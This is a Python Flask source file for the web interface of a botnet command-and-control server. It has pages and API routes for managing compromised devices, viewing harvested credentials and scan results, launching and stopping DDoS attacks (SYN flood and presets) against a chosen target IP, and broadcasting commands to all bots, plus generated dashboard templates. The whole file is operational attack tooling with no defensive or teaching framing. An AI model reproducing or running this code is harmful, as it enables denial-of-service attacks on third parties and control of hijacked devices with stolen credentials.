#!/usr/bin/env python3
"""
Web UI for C2 Server
Flask-based web interface for monitoring and controlling the botnet
"""

from flask import Flask, render_template, jsonify, request, redirect, url_for
import json
import threading
import time
from database import C2Database
from communication import C2CommunicationHandler
from ddos_coordinator import DDoSCoordinator, ATTACK_PRESETS

app = Flask(__name__)
app.secret_key = 'c2_server_secret_key_change_in_production'

# Global variables for server components
db = None
comm_handler = None
ddos_coordinator = None
comm_thread = None

def init_server_components():
    """Initialize server components"""
    global db, comm_handler, ddos_coordinator, comm_thread
    
    db = C2Database()
    comm_handler = C2CommunicationHandler(db=db)
    ddos_coordinator = DDoSCoordinator(db, comm_handler)
    
    # Start communication handler in separate thread
    comm_thread = threading.Thread(target=comm_handler.start_server, daemon=True)
    comm_thread.start()

@app.route('/')
def dashboard():
    """Main dashboard"""
    try:
        stats = db.get_statistics()
        recent_scans = db.get_scan_results(limit=10)
        active_attacks = ddos_coordinator.get_all_active_attacks()
        connected_bots = comm_handler.get_connected_bots()
        
        return render_template('dashboard.html', 
                             stats=stats,
                             recent_scans=recent_scans,
                             active_attacks=active_attacks,
                             connected_bots=connected_bots)
    except Exception as e:
        return f"Error loading dashboard: {e}", 500

@app.route('/bots')
def bots():
    """Compromised devices management"""
    try:
        compromised_devices = db.get_compromised_devices()
        connected_bots = comm_handler.get_connected_bots()
        
        # Mark which devices are currently connected
        for device in compromised_devices:
            device['connected'] = device['ip'] in connected_bots
        
        return render_template('bots.html', devices=compromised_devices)
    except Exception as e:
        return f"Error loading bots: {e}", 500

@app.route('/credentials')
def credentials():
    """Credential management"""
    try:
        successful_creds = db.get_successful_credentials()
        return render_template('credentials.html', credentials=successful_creds)
    except Exception as e:
        return f"Error loading credentials: {e}", 500

@app.route('/scans')
def scans():
    """Network scan results"""
    try:
        scan_results = db.get_scan_results(limit=100)
        return render_template('scans.html', scans=scan_results)
    except Exception as e:
        return f"Error loading scans: {e}", 500

@app.route('/ddos')
def ddos():
    """DDoS attack management"""
    try:
        active_attacks = ddos_coordinator.get_all_active_attacks()
        attack_stats = ddos_coordinator.get_attack_statistics()
        
        return render_template('ddos.html', 
                             active_attacks=active_attacks,
                             attack_stats=attack_stats,
                             attack_presets=ATTACK_PRESETS)
    except Exception as e:
        return f"Error loading DDoS page: {e}", 500

# API Routes
@app.route('/api/stats')
def api_stats():
    """Get current statistics"""
    try:
        stats = db.get_statistics()
        stats['connected_bots'] = len(comm_handler.get_connected_bots())
        return jsonify(stats)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/bots')
def api_bots():
    """Get bot information"""
    try:
        devices = db.get_compromised_devices()
        connected = comm_handler.get_connected_bots()
        
        for device in devices:
            device['connected'] = device['ip'] in connected
        
        return jsonify(devices)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/ddos/start', methods=['POST'])
def api_start_ddos():
    """Start DDoS attack"""
    try:
        data = request.get_json()
        
        target_ip = data.get('target_ip')
        target_port = data.get('target_port', 80)
        attack_type = data.get('attack_type', 'syn_flood')
        duration = data.get('duration', 60)
        packet_size = data.get('packet_size', 1024)
        packet_rate = data.get('packet_rate', 1000)
        
        if not target_ip:
            return jsonify({"error": "Target IP required"}), 400
        
        attack_id = ddos_coordinator.start_ddos_attack(
            target_ip, target_port, attack_type, duration, packet_size, packet_rate
        )
        
        if attack_id:
            return jsonify({
                "success": True,
                "attack_id": attack_id,
                "message": f"DDoS attack {attack_id} started"
            })
        else:
            return jsonify({"error": "Failed to start attack"}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/ddos/stop/<int:attack_id>', methods=['POST'])
def api_stop_ddos(attack_id):
    """Stop specific DDoS attack"""
    try:
        success = ddos_coordinator.stop_ddos_attack(attack_id)
        
        if success:
            return jsonify({
                "success": True,
                "message": f"Attack {attack_id} stopped"
            })
        else:
            return jsonify({"error": "Failed to stop attack"}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/ddos/stop_all', methods=['POST'])
def api_stop_all_ddos():
    """Stop all DDoS attacks"""
    try:
        stopped_count = ddos_coordinator.stop_all_attacks()
        
        return jsonify({
            "success": True,
            "stopped_count": stopped_count,
            "message": f"Stopped {stopped_count} attacks"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/ddos/preset/<preset_name>', methods=['POST'])
def api_ddos_preset(preset_name):
    """Execute DDoS attack preset"""
    try:
        if preset_name not in ATTACK_PRESETS:
            return jsonify({"error": "Unknown preset"}), 400
        
        data = request.get_json()
        target_ip = data.get('target_ip')
        target_port = data.get('target_port', 80)
        
        if not target_ip:
            return jsonify({"error": "Target IP required"}), 400
        
        preset = ATTACK_PRESETS[preset_name].copy()
        preset['target_ip'] = target_ip
        preset['target_port'] = target_port
        
        attack_id = ddos_coordinator.execute_attack_preset(preset)
        
        if attack_id:
            return jsonify({
                "success": True,
                "attack_id": attack_id,
                "preset": preset_name,
                "message": f"Preset attack {attack_id} started"
            })
        else:
            return jsonify({"error": "Failed to start preset attack"}), 500
            
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/api/command/broadcast', methods=['POST'])
def api_broadcast_command():
    """Broadcast command to all bots"""
    try:
        data = request.get_json()
        command = data.get('command')
        parameters = data.get('parameters', {})
        
        if not command:
            return jsonify({"error": "Command required"}), 400
        
        success_count = comm_handler.broadcast_command(command, parameters)
        
        return jsonify({
            "success": True,
            "command": command,
            "success_count": success_count,
            "message": f"Command sent to {success_count} bots"
        })
        
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def create_templates():
    """Create HTML templates for the web UI"""
    import os
    
    templates_dir = "templates"
    if not os.path.exists(templates_dir):
        os.makedirs(templates_dir)
    
    # Base template
    base_template = '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{% block title %}C2 Server{% endblock %}</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .sidebar { background: #2c3e50; min-height: 100vh; }
        .sidebar a { color: #ecf0f1; text-decoration: none; }
        .sidebar a:hover { background: #34495e; color: #fff; }
        .status-active { color: #27ae60; }
        .status-inactive { color: #e74c3c; }
        .attack-card { border-left: 4px solid #e74c3c; }
        .bot-card { border-left: 4px solid #3498db; }
    </style>
</head>
<body>
    <div class="container-fluid">
        <div class="row">
            <nav class="col-md-2 sidebar">
                <div class="py-3">
                    <h4 class="text-center text-light">C2 Control</h4>
                    <hr class="text-light">
                    <ul class="nav flex-column">
                        <li class="nav-item"><a class="nav-link p-3" href="/"><i class="fas fa-tachometer-alt me-2"></i>Dashboard</a></li>
                        <li class="nav-item"><a class="nav-link p-3" href="/bots"><i class="fas fa-robot me-2"></i>Bots</a></li>
                        <li class="nav-item"><a class="nav-link p-3" href="/credentials"><i class="fas fa-key me-2"></i>Credentials</a></li>
                        <li class="nav-item"><a class="nav-link p-3" href="/scans"><i class="fas fa-search me-2"></i>Scans</a></li>
                        <li class="nav-item"><a class="nav-link p-3" href="/ddos"><i class="fas fa-bolt me-2"></i>DDoS</a></li>
                    </ul>
                </div>
            </nav>
            <main class="col-md-10 ms-sm-auto px-4">
                {% block content %}{% endblock %}
            </main>
        </div>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Auto-refresh dashboard every 10 seconds
        setInterval(() => {
            if (window.location.pathname === '/') {
                location.reload();
            }
        }, 10000);
    </script>
</body>
</html>'''
    
    with open(f"{templates_dir}/base.html", "w") as f:
        f.write(base_template)
    
    # Dashboard template
    dashboard_template = '''{% extends "base.html" %}
{% block title %}Dashboard - C2 Server{% endblock %}
{% block content %}
<div class="py-4">
    <h1><i class="fas fa-tachometer-alt me-2"></i>Dashboard</h1>
    
    <div class="row mb-4">
        <div class="col-md-3">
            <div class="card bg-primary text-white">
                <div class="card-body">
                    <h5><i class="fas fa-robot me-2"></i>Active Bots</h5>
                    <h2>{{ stats.active_bots }}</h2>
                </div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="card bg-success text-white">
                <div class="card-body">
                    <h5><i class="fas fa-key me-2"></i>Credentials</h5>
                    <h2>{{ stats.successful_credentials }}</h2>
                </div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="card bg-warning text-white">
                <div class="card-body">
                    <h5><i class="fas fa-bolt me-2"></i>Active Attacks</h5>
                    <h2>{{ stats.active_attacks }}</h2>
                </div>
            </div>
        </div>
        <div class="col-md-3">
            <div class="card bg-info text-white">
                <div class="card-body">
                    <h5><i class="fas fa-search me-2"></i>Recent Scans</h5>
                    <h2>{{ stats.recent_scans }}</h2>
                </div>
            </div>
        </div>
    </div>
    
    <div class="row">
        <div class="col-md-6">
            <div class="card">
                <div class="card-header">
                    <h5><i class="fas fa-robot me-2"></i>Connected Bots</h5>
                </div>
                <div class="card-body">
                    {% if connected_bots %}
                        {% for bot in connected_bots %}
                            <span class="badge bg-success me-1 mb-1">{{ bot }}</span>
                        {% endfor %}
                    {% else %}
                        <p class="text-muted">No bots connected</p>
                    {% endif %}
                </div>
            </div>
        </div>
        <div class="col-md-6">
            <div class="card">
                <div class="card-header">
                    <h5><i class="fas fa-bolt me-2"></i>Active Attacks</h5>
                </div>
                <div class="card-body">
                    {% if active_attacks %}
                        {% for attack in active_attacks %}
                            <div class="attack-card card mb-2">
                                <div class="card-body py-2">
                                    <small><strong>{{ attack.target_ip }}:{{ attack.target_port }}</strong> - {{ attack.attack_type }}</small>
                                </div>
                            </div>
                        {% endfor %}
                    {% else %}
                        <p class="text-muted">No active attacks</p>
                    {% endif %}
                </div>
            </div>
        </div>
    </div>
</div>
{% endblock %}'''
    
    with open(f"{templates_dir}/dashboard.html", "w") as f:
        f.write(dashboard_template)

if __name__ == '__main__':
    # Create templates directory and files
    create_templates()
    
    # Initialize server components
    init_server_components()
    
    print("Starting C2 Web Server...")
    print("Dashboard will be available at: http://localhost:5000")
    
    # Run Flask app
    app.run(host='0.0.0.0', port=5000, debug=False)
